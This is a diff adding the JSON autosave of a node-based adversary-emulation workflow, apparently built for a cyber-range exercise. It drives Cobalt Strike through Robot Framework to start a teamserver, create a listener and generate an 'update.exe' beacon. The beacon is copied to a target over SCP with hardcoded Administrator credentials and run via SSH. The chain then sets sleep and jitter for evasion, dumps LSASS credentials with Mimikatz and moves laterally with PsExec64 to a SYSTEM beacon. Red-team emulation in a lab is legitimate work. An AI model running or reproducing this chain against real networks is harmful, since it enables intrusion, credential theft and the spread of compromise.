@@ -1,0 +1,1280 @@
+{
+  "version": "1.0",
+  "metadata": {
+    "name": "_autosave",
+    "description": "Auto-saved workflow",
+    "author": "ditch",
+    "created": "2026-04-14T11:02:39.998Z",
+    "lastModified": "2026-04-14T11:02:39.998Z",
+    "tags": [
+      "autosave"
+    ]
+  },
+  "globalSettings": {
+    "executionPlanName": "Neon Sagauro",
+    "targetNetwork": "R1",
+    "sessionId": "session_01",
+    "operator": "ditch",
+    "redTeam": "",
+    "notes": "",
+    "c2Server": "10.50.100.5",
+    "csUser": "operator",
+    "csPass": "",
+    "csDir": "/opt/cobaltstrike",
+    "csPort": "50050",
+    "workdir": "~/sandworm/",
+    "debugMode": "${False}",
+    "sudoNeeded": "${False}"
+  },
+  "nodes": [
+    {
+      "id": "cs-create-listener-1775767575418",
+      "type": "opforNode",
+      "position": {
+        "x": -1245,
+        "y": -90
+      },
+      "data": {
+        "definition": {
+          "id": "cs-create-listener",
+          "name": "Create Listener",
+          "icon": "\ud83c\udfd7\ufe0f",
+          "tactic": "TA0042",
+          "category": "Cobalt Strike",
+          "subcategory": "",
+          "description": "Create an HTTP, HTTPS, or SMB listener on the Cobalt Strike teamserver for beacon callbacks",
+          "riskLevel": "medium",
+          "estimatedDuration": 10,
+          "inputs": [
+            {
+              "id": "signal",
+              "label": "Signal",
+              "type": "signal",
+              "required": false
+            }
+          ],
+          "outputs": [
+            {
+              "id": "done",
+              "label": "Complete",
+              "type": "signal"
+            }
+          ],
+          "parameters": [
+            {
+              "id": "listenerName",
+              "label": "Listener Name",
+              "type": "string",
+              "required": true,
+              "placeholder": "HTTP",
+              "default": "HTTP"
+            },
+            {
+              "id": "listenerPort",
+              "label": "Port",
+              "type": "number",
+              "required": true,
+              "placeholder": "80",
+              "default": 80
+            },
+            {
+              "id": "listenerType",
+              "label": "Listener Type",
+              "type": "select",
+              "required": true,
+              "options": [
+                "Beacon_HTTP",
+                "Beacon_HTTPS"
+              ],
+              "default": "Beacon_HTTP"
+            }
+          ],
+          "executionType": "cobalt_strike",
+          "requirements": {
+            "c2Server": true,
+            "libraries": [
+              "cobaltstrikec2/cobaltstrike.py"
+            ]
+          },
+          "robotFramework": {
+            "keyword": "Create Listener",
+            "libraries": [
+              "cobaltstrikec2/cobaltstrike.py"
+            ],
+            "keywordArgs": [
+              {
+                "param": "listenerName",
+                "position": 1,
+                "variableRef": true,
+                "variableName": "HTTP_LISTENER"
+              },
+              {
+                "param": "listenerPort",
+                "position": 2,
+                "variableRef": true,
+                "variableName": "HTTP_LISTENER_PORT"
+              },
+              {
+                "param": "listenerType",
+                "position": 3,
+                "variableRef": true,
+                "variableName": "HTTP_LISTENER_TYPE"
+              },
+              {
+                "globalSetting": "CS_IP",
+                "position": 4
+              }
+            ],
+            "variables": [
+              {
+                "name": "HTTP_LISTENER",
+                "fromParam": "listenerName",
+                "scope": "suite"
+              },
+              {
+                "name": "HTTP_LISTENER_PORT",
+                "fromParam": "listenerPort",
+                "scope": "suite"
+              },
+              {
+                "name": "HTTP_LISTENER_TYPE",
+                "fromParam": "listenerType",
+                "scope": "suite"
+              }
+            ],
+            "preKeywordLog": "=== Creating Listener: ${HTTP_LISTENER} ===",
+            "documentation": "Create scenario listeners",
+            "tags": [
+              "c2",
+              "listener"
+            ]
+          }
+        },
+        "parameters": {
+          "listenerName": "HTTP",
+          "listenerPort": 80,
+          "listenerType": "Beacon_HTTP"
+        },
+        "label": "Create Listener",
+        "validationState": "validated"
+      },
+      "measured": {
+        "width": 160,
+        "height": 103
+      },
+      "selected": false,
+      "dragging": false
+    },
+    {
+      "id": "cs-generate-payload-1775767576451",
+      "type": "opforNode",
+      "position": {
+        "x": -1005,
+        "y": -135
+      },
+      "data": {
+        "definition": {
+          "id": "cs-generate-payload",
+          "name": "Generate Payload",
+          "icon": "\ud83c\udfd7\ufe0f",
+          "tactic": "TA0042",
+          "category": "Cobalt Strike",
+          "subcategory": "",
+          "description": "Generate a Cobalt Strike beacon payload using Create Payload with specified listener and template",
+          "riskLevel": "medium",
+          "estimatedDuration": 30,
+          "inputs": [
+            {
+              "id": "listener_active",
+              "label": "Listener Active",
+              "type": "boolean",
+              "required": true
+            }
+          ],
+          "outputs": [
+            {
+              "id": "payload_ready",
+              "label": "Payload Ready",
+              "type": "boolean",
+              "description": "Payload file generated and ready"
+            }
+          ],
+          "parameters": [
+            {
+              "id": "payloadName",
+              "label": "Payload Name",
+              "type": "string",
+              "required": true,
+              "placeholder": "update",
+              "default": "update"
+            },
+            {
+              "id": "payloadTemplate",
+              "label": "Template",
+              "type": "select",
+              "required": true,
+              "options": [
+                "exe",
+                "dll",
+                "powershell",
+                "raw"
+              ],
+              "default": "exe"
+            },
+            {
+              "id": "listenerName",
+              "label": "Listener",
+              "type": "string",
+              "required": true,
+              "placeholder": "HTTP",
+              "default": "HTTP"
+            },
+            {
+              "id": "outputDir",
+              "label": "Output Dir",
+              "type": "string",
+              "required": true,
+              "placeholder": "${WORKDIR}",
+              "default": "${WORKDIR}"
+            },
+            {
+              "id": "retries",
+              "label": "Retries",
+              "type": "number",
+              "required": false,
+              "placeholder": "5",
+              "default": 5
+            }
+          ],
+          "executionType": "cobalt_strike",
+          "requirements": {
+            "c2Server": true,
+            "listeners": [
+              "HTTP"
+            ],
+            "libraries": [
+              "cobaltstrikec2/cobaltstrike.py"
+            ]
+          },
+          "robotFramework": {
+            "keyword": "Create Payload",
+            "libraries": [
+              "cobaltstrikec2/cobaltstrike.py"
+            ],
+            "keywordArgs": [
+              {
+                "param": "payloadName",
+                "position": 1,
+                "variableRef": true,
+                "variableName": "HTTP_PAYLOAD_NAME"
+              },
+              {
+                "param": "payloadTemplate",
+                "position": 2,
+                "variableRef": false
+              },
+              {
+                "param": "listenerName",
+                "position": 3,
+                "variableRef": true,
+                "variableName": "HTTP_LISTENER"
+              },
+              {
+                "param": "outputDir",
+                "position": 4,
+                "variableRef": false
+              },
+              {
+                "param": "retries",
+                "position": 5,
+                "variableRef": false
+              }
+            ],
+            "variables": [
+              {
+                "name": "HTTP_PAYLOAD_NAME",
+                "fromParam": "payloadName",
+                "scope": "suite"
+              }
+            ],
+            "captureOutput": "PAYLOAD_PATH",
+            "postKeywordLog": "=== Payload Location: ${PAYLOAD_PATH} ===",
+            "documentation": "Generate beacon payload",
+            "tags": [
+              "resource-development",
+              "payload"
+            ]
+          }
+        },
+        "parameters": {
+          "payloadName": "update",
+          "payloadTemplate": "exe",
+          "listenerName": "HTTP",
+          "outputDir": "${WORKDIR}",
+          "retries": 5
+        },
+        "label": "Generate Payload",
+        "validationState": "validated"
+      },
+      "measured": {
+        "width": 160,
+        "height": 103
+      },
+      "selected": false,
+      "dragging": false
+    },
+    {
+      "id": "cs-start-c2-1775767577217",
+      "type": "opforNode",
+      "position": {
+        "x": -1470,
+        "y": -15
+      },
+      "data": {
+        "definition": {
+          "id": "cs-start-c2",
+          "name": "Start C2 Server",
+          "icon": "\ud83c\udfd7\ufe0f",
+          "tactic": "TA0042",
+          "category": "Cobalt Strike",
+          "subcategory": "",
+          "description": "Connect to Cobalt Strike teamserver and initialize C2 infrastructure",
+          "riskLevel": "medium",
+          "estimatedDuration": 30,
+          "inputs": [
+            {
+              "id": "signal",
+              "label": "Signal",
+              "type": "signal",
+              "required": false
+            }
+          ],
+          "outputs": [
+            {
+              "id": "done",
+              "label": "Complete",
+              "type": "signal"
+            }
+          ],
+          "parameters": [
+            {
+              "id": "csIp",
+              "label": "CS IP",
+              "type": "string",
+              "required": true,
+              "placeholder": "10.50.100.5",
+              "default": "${CS_IP}"
+            },
+            {
+              "id": "csUser",
+              "label": "CS User",
+              "type": "string",
+              "required": true,
+              "placeholder": "operator",
+              "default": "${CS_USER}"
+            },
+            {
+              "id": "csPass",
+              "label": "CS Password",
+              "type": "string",
+              "required": true,
+              "placeholder": "password",
+              "default": "${CS_PASS}"
+            },
+            {
+              "id": "csDir",
+              "label": "CS Directory",
+              "type": "string",
+              "required": true,
+              "placeholder": "/opt/cobaltstrike",
+              "default": "${CS_DIR}"
+            },
+            {
+              "id": "csPort",
+              "label": "CS Port",
+              "type": "number",
+              "required": true,
+              "placeholder": "50050",
+              "default": "${CS_PORT}"
+            }
+          ],
+          "executionType": "cobalt_strike",
+          "requirements": {
+            "c2Server": false,
+            "libraries": [
+              "cobaltstrikec2/cobaltstrike.py"
+            ]
+          },
+          "robotFramework": {
+            "keyword": "Start C2",
+            "libraries": [
+              "cobaltstrikec2/cobaltstrike.py"
+            ],
+            "libraryArgs": [
+              {
+                "globalSetting": "CS_USER",
+                "paramName": "user",
+                "position": 1
+              },
+              {
+                "globalSetting": "CS_PASS",
+                "paramName": "cs_password",
+                "position": 2
+              },
+              {
+                "globalSetting": "CS_DIR",
+                "paramName": "cs_dir",
+                "position": 3
+              },
+              {
+                "globalSetting": "CS_PORT",
+                "paramName": "port",
+                "position": 4
+              },
+              {
+                "globalSetting": "DEBUG_MODE",
+                "paramName": "debug",
+                "position": 5
+              }
+            ],
+            "keywordArgs": [],
+            "preKeywordLog": "=== Starting C2: ${CS_IP} ===",
+            "documentation": "Start C2 team server",
+            "tags": [
+              "infrastructure",
+              "c2"
+            ]
+          }
+        },
+        "parameters": {
+          "csIp": "${CS_IP}",
+          "csUser": "${CS_USER}",
+          "csPass": "${CS_PASS}",
+          "csDir": "${CS_DIR}",
+          "csPort": "${CS_PORT}"
+        },
+        "label": "Start C2 Server",
+        "validationState": "validated"
+      },
+      "measured": {
+        "width": 160,
+        "height": 102
+      },
+      "selected": true,
+      "dragging": false
+    },
+    {
+      "id": "cs-initial-access-1775769139864",
+      "type": "opforNode",
+      "position": {
+        "x": -750,
+        "y": -165
+      },
+      "data": {
+        "definition": {
+          "id": "cs-initial-access",
+          "name": "Initial Access via SCP/SSH",
+          "icon": "\ud83d\udeaa",
+          "tactic": "TA0001",
+          "category": "Cobalt Strike",
+          "subcategory": "",
+          "description": "Copy beacon payload to target via SCP then execute via SSH to establish initial foothold",
+          "riskLevel": "medium",
+          "estimatedDuration": 30,
+          "inputs": [
+            {
+              "id": "payload_ready",
+              "label": "Payload Ready",
+              "type": "boolean",
+              "required": true
+            },
+            {
+              "id": "signal",
+              "label": "Signal",
+              "type": "signal",
+              "required": false
+            }
+          ],
+          "outputs": [
+            {
+              "id": "session",
+              "label": "Initial Beacon",
+              "type": "session",
+              "description": "First beacon from target"
+            }
+          ],
+          "parameters": [
+            {
+              "id": "targetIp",
+              "label": "Target IP",
+              "type": "string",
+              "required": true,
+              "placeholder": "172.16.2.5",
+              "default": "172.16.2.5"
+            },
+            {
+              "id": "targetUser",
+              "label": "Target User",
+              "type": "string",
+              "required": true,
+              "placeholder": "Administrator",
+              "default": "Administrator"
+            },
+            {
+              "id": "targetPass",
+              "label": "Target Pass",
+              "type": "string",
+              "required": true,
+              "placeholder": "P@ssw0rd",
+              "default": "P@ssw0rd"
+            },
+            {
+              "id": "targetPath",
+              "label": "Target Drop Path",
+              "type": "string",
+              "required": false,
+              "placeholder": "C:/Users/Administrator/Downloads",
+              "default": "C:/Users/Administrator/Downloads"
+            },
+            {
+              "id": "beaconWait",
+              "label": "Beacon Wait (seconds)",
+              "type": "number",
+              "required": false,
+              "placeholder": "15",
+              "default": 15
+            }
+          ],
+          "executionType": "cobalt_strike",
+          "requirements": {
+            "c2Server": true,
+            "listeners": [
+              "HTTP"
+            ],
+            "payloads": [
+              "update"
+            ],
+            "libraries": [
+              "cobaltstrikec2/cobaltstrike.py",
+              "SSHLibrary",
+              "SCPLibrary"
+            ]
+          },
+          "robotFramework": {
+            "keyword": "Start Command",
+            "libraries": [
+              "cobaltstrikec2/cobaltstrike.py",
+              "SSHLibrary",
+              "SCPLibrary"
+            ],
+            "variables": [
+              {
+                "name": "TARGET1",
+                "fromParam": "targetIp",
+                "scope": "suite"
+              },
+              {
+                "name": "TARGET1_USER",
+                "fromParam": "targetUser",
+                "scope": "suite"
+              },
+              {
+                "name": "TARGET1_PASS",
+                "fromParam": "targetPass",
+                "scope": "suite"
+              },
+              {
+                "name": "TARGET1_DROP_PATH",
+                "fromParam": "targetPath",
+                "default": "C:/Users/Administrator/Downloads",
+                "scope": "suite"
+              },
+              {
+                "name": "BEACON_WAIT",
+                "fromParam": "beaconWait",
+                "default": "15",
+                "scope": "suite"
+              }
+            ],
+            "preKeywordLog": "=== Initial Access \u2192 ${TARGET1} ===",
+            "preKeywordStatements": [
+              "${LOCAL_INITIAL_BEACON}=    Set Variable    ${WORKDIR}update.exe",
+              "SCPLibrary.Open Connection    ${TARGET1}    username=${TARGET1_USER}    password=${TARGET1_PASS}",
+              "SCPLibrary.Put File    ${LOCAL_INITIAL_BEACON}    ${TARGET1_DROP_PATH}/update.exe",
+              "SCPLibrary.Close Connection",
+              "Sleep    5s",
+              "SSHLibrary.Open Connection    ${TARGET1}",
+              "Login    ${TARGET1_USER}    ${TARGET1_PASS}",
+              "Sleep    1s"
+            ],
+            "keywordArgs": [
+              {
+                "staticValue": "${TARGET1_DROP_PATH}\\\\update.exe",
+                "position": 1
+              }
+            ],
+            "postKeywordStatements": [
+              "SSHLibrary.Close Connection",
+              "Sleep    ${BEACON_WAIT}s",
+              "@{_sessions}=    Get Sessions By IP    ${TARGET1}",
+              "${CURRENT_SESSION}=    Set Variable    ${_sessions[0]}"
+            ],
+            "sessionVariable": "CURRENT_SESSION",
+            "documentation": "SCP payload to target and execute via SSH",
+            "tags": [
+              "initial-access",
+              "ssh"
+            ]
+          }
+        },
+        "parameters": {
+          "targetIp": "10.10.104.34",
+          "targetUser": "Administrator",
+          "targetPass": "Simspace1!Simspace1!",
+          "targetPath": "C:/Users/Administrator/Downloads",
+          "beaconWait": 15
+        },
+        "label": "Initial Access via SCP/SSH",
+        "validationState": "validated"
+      },
+      "measured": {
+        "width": 160,
+        "height": 103
+      },
+      "selected": false,
+      "dragging": false
+    },
+    {
+      "id": "cs-session-sleep-1775835114726",
+      "type": "opforNode",
+      "position": {
+        "x": -465,
+        "y": -210
+      },
+      "data": {
+        "definition": {
+          "id": "cs-session-sleep",
+          "name": "Session Sleep",
+          "icon": "\ud83d\udce1",
+          "tactic": "TA0011",
+          "category": "Cobalt Strike",
+          "subcategory": "",
+          "description": "Set beacon sleep timer and jitter percentage to control callback frequency and evade detection",
+          "riskLevel": "medium",
+          "estimatedDuration": 5,
+          "inputs": [
+            {
+              "id": "session",
+              "label": "Beacon Session",
+              "type": "session",
+              "required": true
+            }
+          ],
+          "outputs": [
+            {
+              "id": "session",
+              "label": "Beacon Session",
+              "type": "session",
+              "description": "Session with updated sleep"
+            }
+          ],
+          "parameters": [
+            {
+              "id": "sleepTime",
+              "label": "Sleep Time (seconds)",
+              "type": "number",
+              "required": true,
+              "placeholder": "60",
+              "default": 60
+            },
+            {
+              "id": "jitter",
+              "label": "Jitter %",
+              "type": "number",
+              "required": false,
+              "placeholder": "20",
+              "default": 20
+            }
+          ],
+          "executionType": "cobalt_strike",
+          "requirements": {
+            "c2Server": true,
+            "libraries": [
+              "cobaltstrikec2/cobaltstrike.py"
+            ]
+          },
+          "robotFramework": {
+            "keyword": "Session Sleep",
+            "libraries": [
+              "cobaltstrikec2/cobaltstrike.py"
+            ],
+            "variables": [
+              {
+                "name": "CURRENT_SESSION",
+                "default": "0",
+                "scope": "suite"
+              },
+              {
+                "name": "SLEEP_TIME",
+                "fromParam": "sleepTime",
+                "default": "60",
+                "scope": "suite"
+              },
+              {
+                "name": "JITTER",
+                "fromParam": "jitter",
+                "default": "20",
+                "scope": "suite"
+              }
+            ],
+            "keywordArgs": [
+              {
+                "param": "session",
+                "position": 1,
+                "sessionVariable": "CURRENT_SESSION"
+              },
+              {
+                "param": "sleepTime",
+                "position": 2,
+                "variableRef": true,
+                "variableName": "SLEEP_TIME"
+              },
+              {
+                "param": "jitter",
+                "position": 3,
+                "variableRef": true,
+                "variableName": "JITTER"
+              }
+            ],
+            "documentation": "Set beacon sleep and jitter",
+            "tags": [
+              "c2",
+              "evasion"
+            ]
+          }
+        },
+        "parameters": {
+          "sleepTime": 60,
+          "jitter": 20
+        },
+        "label": "Session Sleep",
+        "validationState": "validated"
+      },
+      "measured": {
+        "width": 160,
+        "height": 102
+      },
+      "selected": false,
+      "dragging": false
+    },
+    {
+      "id": "cs-getuid-1775837453863",
+      "type": "opforNode",
+      "position": {
+        "x": -195,
+        "y": -285
+      },
+      "data": {
+        "definition": {
+          "id": "cs-getuid",
+          "name": "Get UID",
+          "icon": "\ud83d\udd0d",
+          "tactic": "TA0007",
+          "category": "Cobalt Strike",
+          "subcategory": "",
+          "description": "Get the current user identity from an active beacon session",
+          "riskLevel": "medium",
+          "estimatedDuration": 5,
+          "inputs": [
+            {
+              "id": "session",
+              "label": "Beacon Session",
+              "type": "session",
+              "required": true
+            }
+          ],
+          "outputs": [
+            {
+              "id": "uid_result",
+              "label": "UID Result",
+              "type": "string",
+              "description": "Current user identity string"
+            }
+          ],
+          "parameters": [
+            {
+              "id": "session",
+              "label": "Session",
+              "type": "string",
+              "required": true,
+              "placeholder": "${CURRENT_SESSION}",
+              "default": "${CURRENT_SESSION}"
+            }
+          ],
+          "executionType": "cobalt_strike",
+          "requirements": {
+            "c2Server": true,
+            "listeners": [],
+            "payloads": [],
+            "libraries": [
+              "cobaltstrikec2/cobaltstrike.py"
+            ]
+          },
+          "robotFramework": {
+            "keyword": "Run Getuid",
+            "libraries": [
+              "cobaltstrikec2/cobaltstrike.py"
+            ],
+            "keywordArgs": [
+              {
+                "param": "session",
+                "position": 1,
+                "sessionVariable": "CURRENT_SESSION"
+              }
+            ],
+            "captureOutput": "UID_RESULT",
+            "preKeywordLog": "=== Get UID ===",
+            "postKeywordLog": "=== UID: ${UID_RESULT} ===",
+            "documentation": "Get current user identity via Run Getuid",
+            "tags": [
+              "discovery",
+              "identity"
+            ]
+          }
+        },
+        "parameters": {
+          "session": "${CURRENT_SESSION}"
+        },
+        "label": "Get UID",
+        "validationState": "validated"
+      },
+      "measured": {
+        "width": 160,
+        "height": 102
+      },
+      "selected": false,
+      "dragging": false
+    },
+    {
+      "id": "cs-dump-credentials-1775838416670",
+      "type": "opforNode",
+      "position": {
+        "x": 300,
+        "y": -390
+      },
+      "data": {
+        "definition": {
+          "id": "cs-dump-credentials",
+          "name": "Dump Credentials",
+          "icon": "\ud83d\udd11",
+          "tactic": "TA0006",
+          "category": "Cobalt Strike",
+          "subcategory": "",
+          "description": "Dump credentials from LSASS memory using Mimikatz via Cobalt Strike beacon",
+          "riskLevel": "medium",
+          "estimatedDuration": 15,
+          "inputs": [
+            {
+              "id": "session",
+              "label": "Beacon Session",
+              "type": "session",
+              "required": true
+            }
+          ],
+          "outputs": [
+            {
+              "id": "creds",
+              "label": "Credentials",
+              "type": "string",
+              "description": "Dumped credential data"
+            }
+          ],
+          "parameters": [
+            {
+              "id": "session",
+              "label": "Session",
+              "type": "string",
+              "required": true,
+              "placeholder": "${CURRENT_SESSION}",
+              "default": "${CURRENT_SESSION}"
+            }
+          ],
+          "executionType": "cobalt_strike",
+          "requirements": {
+            "c2Server": true,
+            "elevated": true,
+            "libraries": [
+              "cobaltstrikec2/cobaltstrike.py"
+            ]
+          },
+          "robotFramework": {
+            "keyword": "Run Mimikatz",
+            "libraries": [
+              "cobaltstrikec2/cobaltstrike.py"
+            ],
+            "keywordArgs": [
+              {
+                "param": "session",
+                "position": 1,
+                "sessionVariable": "CURRENT_SESSION"
+              }
+            ],
+            "captureOutput": "CRED_DUMP_RESULT",
+            "preKeywordLog": "=== Dumping Credentials (Mimikatz) ===",
+            "postKeywordLog": "=== Credential Dump Complete ===",
+            "documentation": "Dump credentials via Mimikatz",
+            "tags": [
+              "credential-access",
+              "mimikatz"
+            ]
+          }
+        },
+        "parameters": {
+          "session": "${CURRENT_SESSION}"
+        },
+        "label": "Dump Credentials",
+        "validationState": "validated"
+      },
+      "measured": {
+        "width": 160,
+        "height": 102
+      },
+      "selected": false,
+      "dragging": false
+    },
+    {
+      "id": "cs-get-pwd-1775838447705",
+      "type": "opforNode",
+      "position": {
+        "x": 75,
+        "y": -330
+      },
+      "data": {
+        "definition": {
+          "id": "cs-get-pwd",
+          "name": "Get Working Directory",
+          "icon": "\ud83d\udd0d",
+          "tactic": "TA0007",
+          "category": "Cobalt Strike",
+          "subcategory": "",
+          "description": "Get the current working directory on target via beacon",
+          "riskLevel": "medium",
+          "estimatedDuration": 5,
+          "inputs": [
+            {
+              "id": "session",
+              "label": "Beacon Session",
+              "type": "session",
+              "required": true
+            }
+          ],
+          "outputs": [
+            {
+              "id": "pwd_result",
+              "label": "Working Directory",
+              "type": "string",
+              "description": "Current working directory path"
+            }
+          ],
+          "parameters": [
+            {
+              "id": "session",
+              "label": "Session",
+              "type": "string",
+              "required": true,
+              "placeholder": "${CURRENT_SESSION}",
+              "default": "${CURRENT_SESSION}"
+            }
+          ],
+          "executionType": "cobalt_strike",
+          "requirements": {
+            "c2Server": true,
+            "libraries": [
+              "cobaltstrikec2/cobaltstrike.py"
+            ]
+          },
+          "robotFramework": {
+            "keyword": "Issue Shell Cmd",
+            "libraries": [
+              "cobaltstrikec2/cobaltstrike.py"
+            ],
+            "keywordArgs": [
+              {
+                "param": "session",
+                "position": 1,
+                "sessionVariable": "CURRENT_SESSION"
+              },
+              {
+                "staticValue": "echo %CD%",
+                "position": 2
+              }
+            ],
+            "captureOutput": "PWD_RESULT",
+            "preKeywordLog": "=== Get Working Directory ===",
+            "postKeywordLog": "=== PWD: ${PWD_RESULT} ===",
+            "documentation": "Get current working directory via beacon shell",
+            "tags": [
+              "discovery",
+              "filesystem"
+            ]
+          }
+        },
+        "parameters": {
+          "session": "${CURRENT_SESSION}"
+        },
+        "label": "Get Working Directory",
+        "validationState": "validated"
+      },
+      "measured": {
+        "width": 160,
+        "height": 102
+      },
+      "selected": false,
+      "dragging": false
+    },
+    {
+      "id": "cs-lateral-psexec-1775856224064",
+      "type": "opforNode",
+      "position": {
+        "x": 525,
+        "y": -450
+      },
+      "data": {
+        "definition": {
+          "id": "cs-lateral-psexec",
+          "name": "Lateral Move PsExec64",
+          "icon": "\ud83d\ude80",
+          "tactic": "TA0008",
+          "category": "Cobalt Strike",
+          "subcategory": "",
+          "description": "Move laterally to a target host using PsExec via Cobalt Strike bjump - spawns SYSTEM beacon",
+          "riskLevel": "medium",
+          "estimatedDuration": 20,
+          "inputs": [
+            {
+              "id": "session",
+              "label": "Beacon Session",
+              "type": "session",
+              "required": true
+            }
+          ],
+          "outputs": [
+            {
+              "id": "lateral_session",
+              "label": "Lateral Session",
+              "type": "session",
+              "description": "New beacon on lateral target as SYSTEM"
+            }
+          ],
+          "parameters": [
+            {
+              "id": "targetIp",
+              "label": "Target IP",
+              "type": "string",
+              "required": true,
+              "placeholder": "172.16.2.3",
+              "default": "172.16.2.3"
+            },
+            {
+              "id": "listener",
+              "label": "Listener",
+              "type": "string",
+              "required": true,
+              "placeholder": "HTTP",
+              "default": "HTTP"
+            },
+            {
+              "id": "lateralWait",
+              "label": "Lateral Wait (seconds)",
+              "type": "number",
+              "required": false,
+              "placeholder": "15",
+              "default": 15
+            }
+          ],
+          "executionType": "cobalt_strike",
+          "requirements": {
+            "c2Server": true,
+            "listeners": [
+              "HTTP"
+            ],
+            "libraries": [
+              "cobaltstrikec2/cobaltstrike.py"
+            ]
+          },
+          "robotFramework": {
+            "keyword": "Run Bjump",
+            "libraries": [
+              "cobaltstrikec2/cobaltstrike.py"
+            ],
+            "variables": [
+              {
+                "name": "TARGET2",
+                "fromParam": "targetIp",
+                "default": "172.16.2.3",
+                "scope": "suite"
+              },
+              {
+                "name": "LATERAL_WAIT",
+                "fromParam": "lateralWait",
+                "default": "15",
+                "scope": "suite"
+              }
+            ],
+            "keywordArgs": [
+              {
+                "param": "session",
+                "position": 1,
+                "sessionVariable": "CURRENT_SESSION"
+              },
+              {
+                "staticValue": "psexec64",
+                "position": 2
+              },
+              {
+                "param": "targetIp",
+                "position": 3,
+                "variableRef": true,
+                "variableName": "TARGET2"
+              },
+              {
+                "param": "listener",
+                "position": 4,
+                "variableRef": true,
+                "variableName": "HTTP_LISTENER"
+              }
+            ],
+            "postKeywordStatements": [
+              "Sleep    ${LATERAL_WAIT}s",
+              "@{_lateral_sessions}=    Get Sessions By IP    ${TARGET2}",
+              "${CURRENT_SESSION}=    Set Variable    ${_lateral_sessions[0]}"
+            ],
+            "sessionVariable": "CURRENT_SESSION",
+            "preKeywordLog": "=== Lateral Move PSExec \u2192 ${TARGET2} ===",
+            "documentation": "Lateral movement via PsExec64",
+            "tags": [
+              "lateral-movement",
+              "psexec"
+            ]
+          }
+        },
+        "parameters": {
+          "targetIp": "10.10.104.35",
+          "listener": "HTTP",
+          "lateralWait": 15
+        },
+        "label": "Lateral Move PsExec64",
+        "validationState": "validated"
+      },
+      "measured": {
+        "width": 160,
+        "height": 103
+      },
+      "selected": false,
+      "dragging": false
+    }
+  ],
+  "edges": [
+    {
+      "source": "cs-start-c2-1775767577217",
+      "sourceHandle": "done",
+      "target": "cs-create-listener-1775767575418",
+      "targetHandle": "signal",
+      "animated": true,
+      "style": {
+        "stroke": "hsl(210, 100%, 50%)",
+        "strokeWidth": 2
+      },
+      "id": "xy-edge__cs-start-c2-1775767577217done-cs-create-listener-1775767575418signal"
+    },
+    {
+      "source": "cs-create-listener-1775767575418",
+      "sourceHandle": "done",
+      "target": "cs-generate-payload-1775767576451",
+      "targetHandle": "listener_active",
+      "animated": true,
+      "style": {
+        "stroke": "hsl(210, 100%, 50%)",
+        "strokeWidth": 2
+      },
+      "id": "xy-edge__cs-create-listener-1775767575418done-cs-generate-payload-1775767576451listener_active"
+    },
+    {
+      "source": "cs-generate-payload-1775767576451",
+      "sourceHandle": "payload_ready",
+      "target": "cs-initial-access-1775769139864",
+      "targetHandle": "payload_ready",
+      "animated": true,
+      "style": {
+        "stroke": "hsl(210, 100%, 50%)",
+        "strokeWidth": 2
+      },
+      "id": "xy-edge__cs-generate-payload-1775767576451payload_ready-cs-initial-access-1775769139864payload_ready"
+    },
+    {
+      "source": "cs-initial-access-1775769139864",
+      "sourceHandle": "session",
+      "target": "cs-session-sleep-1775835114726",
+      "targetHandle": "session",
+      "animated": true,
+      "style": {
+        "stroke": "hsl(210, 100%, 50%)",
+        "strokeWidth": 2
+      },
+      "id": "xy-edge__cs-initial-access-1775769139864session-cs-session-sleep-1775835114726session"
+    },
+    {
+      "source": "cs-session-sleep-1775835114726",
+      "sourceHandle": "session",
+      "target": "cs-getuid-1775837453863",
+      "targetHandle": "session",
+      "animated": true,
+      "style": {
+        "stroke": "hsl(210, 100%, 50%)",
+        "strokeWidth": 2
+      },
+      "id": "xy-edge__cs-session-sleep-1775835114726session-cs-getuid-1775837453863session"
+    },
+    {
+      "source": "cs-getuid-1775837453863",
+      "sourceHandle": "uid_result",
+      "target": "cs-get-pwd-1775838447705",
+      "targetHandle": "session",
+      "animated": true,
+      "style": {
+        "stroke": "hsl(210, 100%, 50%)",
+        "strokeWidth": 2
+      },
+      "id": "xy-edge__cs-getuid-1775837453863uid_result-cs-get-pwd-1775838447705session"
+    },
+    {
+      "source": "cs-get-pwd-1775838447705",
+      "sourceHandle": "pwd_result",
+      "target": "cs-dump-credentials-1775838416670",
+      "targetHandle": "session",
+      "animated": true,
+      "style": {
+        "stroke": "hsl(210, 100%, 50%)",
+        "strokeWidth": 2
+      },
+      "id": "xy-edge__cs-get-pwd-1775838447705pwd_result-cs-dump-credentials-1775838416670session"
+    },
+    {
+      "source": "cs-dump-credentials-1775838416670",
+      "sourceHandle": "creds",
+      "target": "cs-lateral-psexec-1775856224064",
+      "targetHandle": "session",
+      "animated": true,
+      "style": {
+        "stroke": "hsl(210, 100%, 50%)",
+        "strokeWidth": 2
+      },
+      "id": "xy-edge__cs-dump-credentials-1775838416670creds-cs-lateral-psexec-1775856224064session"
+    }
+  ],
+  "viewport": {
+    "x": 915.7452340038978,
+    "y": 425.89671361751425,
+    "zoom": 0.5781143654550037
+  }
+}
